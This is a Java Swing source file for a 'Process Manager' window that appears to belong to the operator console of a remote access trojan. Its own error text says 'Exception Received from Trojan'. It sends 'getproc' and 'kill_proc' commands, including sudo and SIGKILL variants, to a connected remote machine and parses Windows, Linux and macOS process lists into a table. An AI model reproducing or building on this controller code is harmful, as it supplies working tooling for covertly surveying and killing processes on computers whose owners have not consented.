package New;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.util.ArrayList;

import javax.swing.*;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;
public class Process_Manager {
	private  JFrame form ;
	private  JTable j; 
	private    JScrollPane sp;
    private  JPopupMenu popupMenu;
    private  JMenuItem menuItem_Run_File;
    private  JMenuItem menuItem_Run_File2;
    private  JMenuItem menuItem_Run_File3;
    private  JMenuItem Refresh_menuitem;
 

	private  String Exe_Split = "fxf0x4x4x0fxf";
	private  String Exe_Ending = "c2x2824x828200x0c";
	private  String Jar_Split = "fxf0x4x4x0fxf";
	private  String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
    private  String title = "";
 
	
	
	public Process_Manager(String ip){
		this.sock = ip;
	 
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public String Get_sock(){
		return sock ;
	}
	public void command(){
		try{	get_row_index();}
		catch(Exception x){}
		  sock = title.replace("Process Manager For : "  , "");
	 
		Master.Send_Data("getproc" + Exe_Split + Exe_Ending,sock,false);
	}
	 class CellRenderer implements TableCellRenderer {
		 
	        @Override
	        public Component getTableCellRendererComponent(JTable table,
	                Object value,
	                boolean isSelected,
	                boolean hasFocus,
	                int row,
	                int column) {
	 
	            TableColumn tb = j.getColumn("Image");
	            tb.setMaxWidth(60);
	            tb.setMinWidth(60);
	 
	            j.setRowHeight(60);
	 
	            return (Component) value;
	        }
	 
	    }
	public void yourAddRow(String str0,String str1, String str2, String str3 ){
		  DefaultTableModel Model = (DefaultTableModel) j.getModel();
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					 
			 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
			 	    		return;
			 	    	}
			 	      }
			 	}
			 if(str0 == "#"){
				 //Drive icon
				// CellRenderer CellRenderer = new CellRenderer();
				// j.getColumn("Image").setCellRenderer(CellRenderer);
				 ImageIcon icon=new ImageIcon(Master.class.getResource("processicon.png"));
				 
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "$"){
				 //Folder icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("folder.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "@"){
				 //File icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("file.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					  j.setRowHeight(row, 25);
					   
			 	      }
			 	}
			 TableColumnModel columnModel = j.getColumnModel();
			  columnModel.getColumn(0).setMaxWidth(25);
			// setColumnWidths(j,0);
		 //IP is 2nd column
		   
		}
	public static void setColumnWidths(JTable table, int... widths) {
	    TableColumnModel columnModel = table.getColumnModel();
	    for (int i = 0; i < widths.length; i++) {
	        if (i < columnModel.getColumnCount()) {
	            columnModel.getColumn(i).setMaxWidth(widths[i]);
	        }
	        else break;
	    }
	}
	 private static  ArrayList<String> SplitString(String s){
		 String Word = "";
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  ArrayList<String> SplitString_D(String s,String Delimeter){
		 String Word = "";
		 
		 String YY = Delimeter;
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  String convertSize(float iSize)
	 {
	   if (iSize <= 0.0F) {
	     return "0";
	   }
	   
	   String[] units = { "Bytes", "KB", "MB", "GB", "TB" };
	   int digitGroups = (int)(Math.log10(iSize) / Math.log10(1024.0D));
	   
	   return new java.text.DecimalFormat("#,##0.#")
	     .format(iSize / Math.pow(1024.0D, digitGroups)) + 
	     " " + units[digitGroups];
	 }
	public  void Perform_data(String Received){
		 form.setTitle("Process Manager For : " + sock);
		 form.repaint();
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		//  System.out.println("here          " + Received );
			if (Received.isEmpty()==false){
				 
					Received = Received.replace("c2x2824x828200x0c", YY);
					
					  switch (SplitString(Received).get(0)){
					  
					  case "get_proc":
						  if(SplitString(Received).get(2).equals("windows") || SplitString(Received).get(2).equals("indows")){
							  String all_process_data = SplitString(Received).get(3);
							  String[] process_lines =all_process_data.split("proc_end_line"); 
							  try{
							  for (String p_line : process_lines){
								  try{
									  String[] process_data =p_line.split("proc_splt"); 
									  String Proc_name = process_data[0];
										 String Proc_PID = process_data[1];
										 String Proc_Session_Name =process_data[2];
										 String Proc_Session_Num =process_data[3];
										  yourAddRow("#",Proc_name,Proc_PID ,Proc_Session_Num + " Session Name : " + Proc_Session_Name);
											 j.repaint();
											 //sp = new JScrollPane(j); 
										     //sp.setBounds(5, 50, 990, 300); 
										     sp.updateUI();
											 form.repaint();
								  }catch(Exception e){}
								  
							  }
							  }catch(Exception e){}
						  }
						  
						 
						  break;
						case "result_proc_linux":	
							String process_data = Received.replace("liner_split", "proc_end_line");
							String[] process_lines =process_data.split("proc_end_line"); 
							  for (String p_line : process_lines){
							 String numeric=p_line.split(" ")[0];
							  String withoutWhitespace =  p_line.replace(" ", "\\");
							  String value1 = "";
							  String value2 = "";
							  boolean fill_value2 =false;
							  for (int i = 0;i<withoutWhitespace.length();i++){
								  
								  if(withoutWhitespace.toCharArray()[i] != '\\'){
									  if (fill_value2==false){
										  if(isNumeric(withoutWhitespace.toCharArray()[i]+"")){
											  value1 =  value1 + withoutWhitespace.toCharArray()[i];
											  if(i+1<withoutWhitespace.length()){
												  if(withoutWhitespace.toCharArray()[i+1] == '\\'){
													  fill_value2=true;
												  }
											  }
										  }
										
										  
									  }else   if (fill_value2==true){
									 
											  value2 =  value2 + withoutWhitespace.toCharArray()[i];
											  if(i+1<withoutWhitespace.length()){
												  if(withoutWhitespace.toCharArray()[i+1] == '\\'){
													  fill_value2=false;
												  }
											  }else{
												  fill_value2=false;
											  }
										   
										
									  }
									 
									
								  }
							  }
							  String Proc_PID = value1;
								 String Proc_Session_Name ="?? N/A";
								 
								  yourAddRow("#",value2,Proc_PID , " Session Name : " + Proc_Session_Name);
									 j.repaint();
									 //sp = new JScrollPane(j); 
								     //sp.setBounds(5, 50, 990, 300); 
								     sp.updateUI();
									 form.repaint();
						//	  System.out.println("here          " + value1 + "aaa" + value2 );
							  }
							 
						  		break;  
						case "result_proc_other":	
							String process_data1 = Received.replace("liner_split", "proc_end_line");
							String[] process_lines1 =process_data1.split("proc_end_line"); 
							 for (String p_line : process_lines1){
								  String withoutWhitespace =  p_line.replace(" ", "\\");
								  String value1 = "";
								  String value2 = "";
								  boolean fill_value2 =false;
								  for (int i = 0;i<withoutWhitespace.length();i++){
									  
									  if(withoutWhitespace.toCharArray()[i] != '\\'){
										  if (fill_value2==false){
											  if(isNumeric(withoutWhitespace.toCharArray()[i]+"")){
												  value1 =  value1 + withoutWhitespace.toCharArray()[i];
												  if(i+1<withoutWhitespace.length()){
													  if(withoutWhitespace.toCharArray()[i+1] == '\\'){
														  fill_value2=true;
													  }
												  }
											  }
											
											  
										  }else   if (fill_value2==true){
										 
												  value2 =  value2 + withoutWhitespace.toCharArray()[i];
												  if(i+1<withoutWhitespace.length()){
													  if(withoutWhitespace.toCharArray()[i+1] == '\\'){
														  fill_value2=false;
													  }
												  }else{
													  fill_value2=false;
												  }
											   
											
										  }
										 
										
									  }
								  }
								  String Proc_PID = value1;
									 String Proc_Session_Name ="?? N/A";
									 
									  yourAddRow("#",value2,Proc_PID , " Session Name : " + Proc_Session_Name);
										 j.repaint();
										 //sp = new JScrollPane(j); 
									     //sp.setBounds(5, 50, 990, 300); 
									     sp.updateUI();
										 form.repaint();
							//	  System.out.println("here          " + value1 + "aaa" + value2 );
							  }
					 
						  		break;  
							 
						case "result_proc_mac":	
							String process_data2 = Received.replace("liner_split", "proc_end_line");
							String[] process_lines2 =process_data2.split("proc_end_line"); 
							  for (String p_line : process_lines2){
								  String withoutWhitespace =  p_line.replace(" ", "\\");
								  String value1 = "";
								  String value2 = "";
								  boolean fill_value2 =false;
								  for (int i = 0;i<withoutWhitespace.length();i++){
									  
									  if(withoutWhitespace.toCharArray()[i] != '\\'){
										  if (fill_value2==false){
											  if(isNumeric(withoutWhitespace.toCharArray()[i]+"")){
												  value1 =  value1 + withoutWhitespace.toCharArray()[i];
												  if(i+1<withoutWhitespace.length()){
													  if(withoutWhitespace.toCharArray()[i+1] == '\\'){
														  fill_value2=true;
													  }
												  }
											  }
											
											  
										  }else   if (fill_value2==true){
										 
												  value2 =  value2 + withoutWhitespace.toCharArray()[i];
												  if(i+1<withoutWhitespace.length()){
													  if(withoutWhitespace.toCharArray()[i+1] == '\\'){
														  fill_value2=false;
													  }
												  }else{
													  fill_value2=false;
												  }
											   
											
										  }
										 
										
									  }
								  }
								  String Proc_PID = value1;
									 String Proc_Session_Name ="?? N/A";
									 
									  yourAddRow("#",value2,Proc_PID , " Session Name : " + Proc_Session_Name);
										 j.repaint();
										 //sp = new JScrollPane(j); 
									     //sp.setBounds(5, 50, 990, 300); 
									     sp.updateUI();
										 form.repaint();
							//	  System.out.println("here          " + value1 + "aaa" + value2 );
									  }
						  
						  		break;  
						case "error_terminal_proc":	
							String process_data3 = Received.replace("liner_split", "proc_end_line");
							 new MessageBox().errorBox_nothread("Error Fetching Process on OS", "Exception Received from Trojan");
							
						  		break;   
					 
						  
					 
					  }
					
				 
					
				
			}
				
		
	}
	private  boolean isNumeric(String strNum) {
	    try {
	        double d = Double.parseDouble(strNum);
	    } catch (NumberFormatException | NullPointerException nfe) {
	        return false;
	    }
	    return true;
	}
	public  void Do_frame(){
		 form = new JFrame();
		 form.setName("Process Manager For : " + sock);
		 form.setTitle("Process Manager For : " + sock);
		 title = "Process Manager For : " + sock;
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 
		  
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
			final JPopupMenu popupMenu = new JPopupMenu();
		     menuItem_Run_File = new JMenuItem("Kill Process"); 
		     menuItem_Run_File2 = new JMenuItem("Sudo Kill Process"); 
		     menuItem_Run_File3 = new JMenuItem("SIGKill Process"); 
		     Refresh_menuitem = new JMenuItem("Refresh");
		   
			popupMenu.add(Refresh_menuitem);
			popupMenu.add(menuItem_Run_File);
			popupMenu.add(menuItem_Run_File2);
			popupMenu.add(menuItem_Run_File3);
	
			 
			
			ImageIcon icon=new ImageIcon("Drive.png");
		    Object[] columnNames = {"","Process Name", "PID & Session Data", "# / Session No."}; 

			// adding it to JScrollPane 
	       /* for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }*/
	        model.setColumnIdentifiers(columnNames);
	      	j = new JTable(model); 
	      	 
	      	
	      	        
	        j.setBounds(5, 100, 485, 290); 
	        j.setComponentPopupMenu(popupMenu);
			 
	        
	        j.addMouseListener(new MouseAdapter() {
	        	public void mousePressed(MouseEvent e) {
	        	      showPopup(e);
	        	    }
	        	    public void mouseReleased(MouseEvent e) {
	        	      showPopup(e);
	        	    }
	        	    private void showPopup(MouseEvent e) {
	        	      if (e.isPopupTrigger()) {
	        	    	  popupMenu.show(e.getComponent(), e.getX(), e.getY());
	        	      }
	        	    }
	            public void mouseClicked(MouseEvent me) {
	               if (me.getClickCount() == 2) {     // to detect doble click events
	                  JTable target = (JTable)me.getSource();
	                  int row = target.getSelectedRow(); // select a row
	                  int column = target.getSelectedColumn(); // select a column
	                  String selected_Value_double_click =j.getModel().getValueAt(row, 1).toString();
	                  String item_type =j.getModel().getValueAt(row, 2).toString();
	                   
	                  
	                  
	               }
	            }
	         });
	        
	        
	        
	        Refresh_menuitem.addActionListener(new ActionListener() {
	        	
	  				public void actionPerformed(ActionEvent event) {
	  					//do here some stuff
	  					get_row_index();
	  					command();
		  		       }
	  			});
	        ImageIcon icon_cforit =  new ImageIcon(Master.class.getResource("/some_icons/" + "psr_207.png" ));
	        
	        menuItem_Run_File.setIcon(icon_cforit);
	        menuItem_Run_File2.setIcon(icon_cforit);
	        menuItem_Run_File3.setIcon(icon_cforit);
	        
	        
	         
	        menuItem_Run_File.setBackground(Color.white);
	        menuItem_Run_File2.setBackground(Color.white);
	        menuItem_Run_File3.setBackground(Color.white);
	        Refresh_menuitem.setBackground(Color.white);
	        
	        Refresh_menuitem.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "refresh.png" )));
	        
   menuItem_Run_File.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 2).toString();
						sock = title.replace("Process Manager For : "  , "");
						Master.Send_Data("kill_proc"  +  Exe_Split+  selected_item    +  Exe_Split + Exe_Ending , sock,false);
		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
		        		
		         
				}
			});
   menuItem_Run_File2.addActionListener(new ActionListener() {
   	
		public void actionPerformed(ActionEvent event) {
			//do here some stuff
				int selectedRow = j.getSelectedRow();
				String selected_item = j.getModel().getValueAt(selectedRow, 2).toString();
				sock = title.replace("Process Manager For : "  , "");
				Master.Send_Data("kill_proc"  +  Exe_Split+  selected_item    +  Exe_Split  +"sudo_kill" +  Exe_Split + Exe_Ending , sock,false);
       		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
       		
        
		}
	});
   menuItem_Run_File3.addActionListener(new ActionListener() {
   	
		public void actionPerformed(ActionEvent event) {
			//do here some stuff
				int selectedRow = j.getSelectedRow();
				String selected_item = j.getModel().getValueAt(selectedRow, 2).toString();
				sock = title.replace("Process Manager For : "  , "");
				Master.Send_Data("kill_proc"  +  Exe_Split+  selected_item    +  Exe_Split  +"sig_kill" +  Exe_Split + Exe_Ending , sock,false);
       		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
       		
        
		}
	});
			
	    
			 
			
			
			
			
		    form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			      
			    	 if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to close Prcocess Manager "+ sock +" window?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			      Master.Remove_Form_Open_Proc(sock);
			        } 
			    }
			}); 
			
			
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
	 
		//	 form.add(btnNext);
			// form.add(Dir);
		        sp = new JScrollPane(j); 
		        j.setFont(fontx);
		        sp.setBounds(5, 100, 485, 290); 
		        form.setLayout(new BorderLayout());
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		      
		       
				   // spRight.setDividerSize(300);
				   // spRight.setContinuousLayout(true);
				    final JSplitPane split;

				    split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, Buttons,sp );
				   // split.setContinuousLayout(false);
				    split.setDividerSize(10);
				    split.setDividerLocation(120);
				    split.setOneTouchExpandable(true);
				    //form.add(split, BorderLayout.CENTER);
				    form.addComponentListener(new ComponentAdapter() {
				        public void componentResized(ComponentEvent componentEvent) {
				        	split.setDividerLocation(5);
				        	//Dir.setSize(form.getWidth()-10,Dir.getHeight() );
				        	split.validate();
				        	split.repaint();
				        }
				    });
				 //form.add(sp);
			        //form.add(leftSplitPane, BorderLayout.WEST);
			       // form.add(splitPane, BorderLayout.CENTER);
				 form.validate();
				 form.setResizable(true);
				    form.getContentPane().add(split, BorderLayout.CENTER);
		        
		        
		        
		        
		        
		        
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
			 this.command();
			
	}
	
	
	public void get_row_index(){
		 
		 DefaultTableModel dm = (DefaultTableModel) j.getModel();
		 int rowCount = dm.getRowCount();
		 //Remove rows one by one from the end of the table
		 for (int i = rowCount - 1; i >= 0; i--) {
		     dm.removeRow(i);
		 	j.repaint();
		 }
	}
	
}
